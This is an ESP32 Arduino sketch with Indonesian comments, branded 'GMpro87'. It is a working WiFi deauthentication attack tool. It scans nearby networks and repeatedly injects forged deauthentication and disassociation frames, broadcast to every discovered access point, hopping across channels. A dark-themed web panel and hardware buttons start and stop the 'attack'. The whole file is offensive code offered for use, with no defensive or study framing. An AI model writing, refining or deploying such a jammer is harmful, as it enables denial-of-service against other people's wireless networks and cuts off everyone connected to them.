#include <WiFi.h>
#include <WebServer.h>
#include <vector>
#include <string>
#include <EEPROM.h>
#include "esp_wifi.h"


// --- CONFIGURASI PIN ---
const int btnDeauth = 2; 
const int btnScan = 3;   
const int ledPin = 8;    


// --- STRUKTUR DATA ---
struct wifiData {
  int num = 0;
  std::vector<std::string> ssid;
  std::vector<uint8_t*> bssid; // Tetap pakai pointer (asli Anda)
  std::vector<int> channel;
};


// --- VARIABLE GLOBAL ---
wifiData targetData;
bool isAttacking = false;
uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// --- WEB SERVER ---
WebServer server(80);

// --- FUNGSI PACKET INJECTION (AGRESIF) ---
void sendAggressivePacket(const uint8_t* bssid, const uint8_t* sta) {
  struct __attribute__((packed)) packet_t {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint8_t sequence_control[2];
    uint8_t reason_code[2];
  };
  
  packet_t packet;
  memset(&packet, 0, sizeof(packet));
  
  packet.duration[0] = 0x00;
  packet.duration[1] = 0x00;
  memcpy(packet.addr1, sta, 6);
  memcpy(packet.addr2, bssid, 6);
  memcpy(packet.addr3, bssid, 6);
  packet.sequence_control[0] = 0x00;
  packet.sequence_control[1] = 0x00;
  
  for (int i = 0; i < 40; i++) {
    // Deauth (0xC0) - Reason 7
    packet.frame_control[0] = 0xC0;
    packet.reason_code[0] = 0x07;
    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&packet, sizeof(packet), false);
     
    // Disassociation (0xA0) - Reason 4
    packet.frame_control[0] = 0xA0;
    packet.reason_code[0] = 0x04;
    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&packet, sizeof(packet), false);
  }
}


// --- FUNGSI SCAN ---
void scanNetworks() {
  digitalWrite(ledPin, HIGH); 
  Serial.println("\n[SCANNING] Harap tunggu...");
  
  
  // Bersihkan data lama DENGAN BENAR
  for(auto b : targetData.bssid) free(b);
  targetData.bssid.clear();
  targetData.ssid.clear();
  targetData.channel.clear();

  int n = WiFi.scanNetworks();
  targetData.num = n;

  if (n == 0) {
    Serial.println("[!] Tidak ada WiFi ditemukan.");
  } else {
    Serial.printf("[+] Ditemukan %d target:\n", n);
    for (int i = 0; i < n; ++i) {
      targetData.ssid.push_back(WiFi.SSID(i).c_str());
      targetData.channel.push_back(WiFi.channel(i));
      
      uint8_t* b = (uint8_t*)malloc(6);
      memcpy(b, WiFi.BSSID(i), 6);
      targetData.bssid.push_back(b);

      Serial.printf("%d: %s (Ch:%d) [%s]\n", i+1, WiFi.SSID(i).c_str(), WiFi.channel(i), WiFi.BSSIDstr(i).c_str());
    }
  }
  digitalWrite(ledPin, LOW);
}


// --- WEB UI ---
void handleRoot() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>";
  html += "<title>GMpro87</title><style>";
  html += "body{background:#0a0a0a;color:#e0e0e0;font-family:'Segoe UI',sans-serif;margin:0;padding:20px;}";
  html += ".container{max-width:800px;margin:0 auto;}";
  html += "h1{color:#00ff88;text-align:center;font-size:2.5em;margin-bottom:20px;}";
  html += ".card{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:20px;margin-bottom:20px;}";
  html += ".btn{background:#00ff88;color:#0a0a0a;border:none;padding:12px 24px;border-radius:8px;cursor:pointer;font-weight:bold;margin:5px;}";
  html += ".btn:hover{background:#00cc66;}";
  html += ".btn-danger{background:#ff4444;} .btn-danger:hover{background:#cc0000;}";
  html += "table{width:100%;border-collapse:collapse;}";
  html += "th,td{padding:12px;border-bottom:1px solid #333;text-align:left;}";
  html += "th{color:#00ff88;}";
  html += ".status{display:inline-block;padding:6px 12px;border-radius:6px;font-size:0.9em;}";
  html += ".status-on{background:#00ff88;color:#000;}";
  html += ".status-off{background:#333;color:#888;}";
  html += "</style></head><body><div class='container'>";
  
  html += "<h1>GMpro87</h1>";
  html += "<div class='card'><h2>WiFi Networks</h2>";
  html += "<p>Found: " + String(targetData.num) + " networks</p>";
  html += "<table><tr><th>#</th><th>SSID</th><th>Channel</th><th>BSSID</th></tr>";
  
  for (int i = 0; i < targetData.num; i++) {
    html += "<tr><td>" + String(i+1) + "</td><td>" + targetData.ssid[i].c_str() + "</td><td>" + String(targetData.channel[i]) + "</td><td>" + WiFi.BSSIDstr(i) + "</td></tr>";
  }
  html += "</table></div>";
  
  html += "<div class='card'><h2>Attack Control</h2>";
  html += "<p>Status: <span class='status ";
  html += isAttacking ? "status-on'>RUNNING" : "status-off'>STOPPED";
  html += "</span></p>";
  html += "<a href='/scan'><button class='btn'>Scan Networks</button></a> ";
  html += "<a href='/attack'><button class='btn ";
  html += isAttacking ? "btn-danger" : "";
  html += "'>";
  html += isAttacking ? "Stop Attack" : "Start Attack";
  html += "</button></a>";
  html += "</div>";
  
  html += "<div class='card'><h2>System</h2>";
  html += "<p>GMpro87 v1.2 | ESP32-WROOM-32U</p>";
  html += "</div></div></body></html>";
  
  server.send(200, "text/html", html);
}


void handleScan() {
  scanNetworks();
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}


void handleAttack() {
  if (targetData.num > 0) {
    isAttacking = !isAttacking;
    Serial.printf("\n[ATTACK] Status: %s\n", isAttacking ? "RUNNING" : "STOPPED");
  }
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}


// --- SETUP ---
void setup() {
  Serial.begin(115200);
  pinMode(btnDeauth, INPUT_PULLUP);
  pinMode(btnScan, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);

  // WiFi AP Mode (FIXED: Tidak diganggu dengan WIFI_STA setelahnya)
  WiFi.mode(WIFI_AP);
  WiFi.softAP("GMpro", "Sangkur87");
  Serial.println("\n[+] AP Created: GMpro / Sangkur87");
  Serial.println("[+] Web UI: http://192.168.4.1");

  // WiFi Scan Mode (HANYA UNTUK SCAN)
  WiFi.mode(WIFI_AP_STA); // AP+STA mode, AP tetap hidup
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);

  // Web Server
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/attack", handleAttack);
  server.begin();

  Serial.println("\n============================");
  Serial.println("  GMpro87 v1.2 - Fixed");
  Serial.println("============================");
  Serial.println("D3: Scan | D2: Attack ON/OFF");
  Serial.println("Web: http://192.168.4.1");
}


// --- LOOP ---
void loop() {
  server.handleClient();

  // Tombol Scan
  if (digitalRead(btnScan) == LOW) {
    delay(200);
    isAttacking = false;
    scanNetworks();
    while(digitalRead(btnScan) == LOW);
  }

  // Tombol Attack
  if (digitalRead(btnDeauth) == LOW) {
    delay(200);
    if (targetData.num > 0) {
      isAttacking = !isAttacking;
      Serial.printf("\n[ATTACK] Status: %s\n", isAttacking ? "RUNNING" : "STOPPED");
    } else {
      Serial.println("[!] Scan dulu sebelum menyerang!");
    }
    while(digitalRead(btnDeauth) == LOW);
  }

  // Eksekusi Serangan
  if (isAttacking) {
    for (int i = 0; i < targetData.num; i++) {
      if (!isAttacking) break;
      esp_wifi_set_channel(targetData.channel[i], WIFI_SECOND_CHAN_NONE);
      sendAggressivePacket(targetData.bssid[i], broadcastAddr);
      digitalWrite(ledPin, !digitalRead(ledPin));
      yield();
    }
  } else {
    digitalWrite(ledPin, LOW);
  }
}
